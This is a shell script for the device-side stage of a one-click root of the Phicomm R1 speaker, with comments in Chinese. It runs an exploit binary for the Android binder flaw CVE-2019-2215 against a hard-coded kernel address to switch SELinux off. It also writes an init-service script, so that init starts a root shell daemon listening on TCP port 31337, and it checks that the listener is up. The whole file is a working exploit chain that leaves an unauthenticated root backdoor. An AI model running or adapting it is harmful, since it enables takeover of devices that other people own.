#!/system/bin/sh
# Phicomm R1 一键 root —— 设备端部分
# 必须以 uid1000（system_app）身份执行（通过 IJetty / ProductionTest echo_test）
# 用法: onkey.sh [文件目录] [rootd端口]
#   文件目录中需要 exp2224 和 rootd（由 onkey.ps1 推送）

D="${1:-/sdcard/r1root}"
PORT="${2:-31337}"

echo "[*] files=$D port=$PORT"

# 1) 准备 root 执行入口：init 服务 cifsmanager -> /data/etc/cifsmanager.sh
mkdir -p /data/etc || exit 1
{
    echo '#!/system/bin/sh'
    echo "/cache/rootd $PORT &"
    echo 'exit 0'
} > /data/etc/cifsmanager.sh
chmod 755 /data/etc/cifsmanager.sh

# 2) 放置 rootd 与利用程序（/data/system 对 uid1000 可执行）
cp "$D/rootd" /cache/rootd || exit 1
chmod 755 /cache/rootd
cp "$D/exp2224" /data/system/exp2224 || exit 1
chmod 755 /data/system/exp2224

# 3) CVE-2019-2215：任意内核写 -> selinux_enforcing = 0
echo "[*] exploiting (selinux_enforcing -> 0) ..."
/data/system/exp2224 c0f7fb0c 0
echo "[*] selinux: $(getenforce)"

# 4) 让 init(root) 启动 /data/etc/cifsmanager.sh
setprop ctl.start cifsmanager
sleep 1

if netstat -ltn 2>/dev/null | grep -q ":$PORT"; then
    echo "[+] OK: root shell listening on :$PORT (uid=0)"
else
    echo "[-] FAILED: no listener on :$PORT (selinux may not be permissive)"
    exit 2
fi
